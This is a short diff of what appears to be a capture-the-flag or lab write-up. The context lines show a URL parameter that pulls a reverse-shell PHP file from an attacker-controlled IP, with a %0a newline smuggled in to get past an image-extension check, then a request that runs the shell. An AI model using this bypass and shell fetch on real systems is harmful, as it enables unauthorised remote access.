@@ -40,6 +40,8 @@ url=http%3A%2F%2F10.18.21.236%3A8000%2Frevsh.php%0a.jpg
 ```
 Obs the %0a
 
+http://10.10.66.65/cloud/images/cat.jpg
+
 Go to script
 ```http
 GET /cloud/images/revsh.php HTTP/1.1
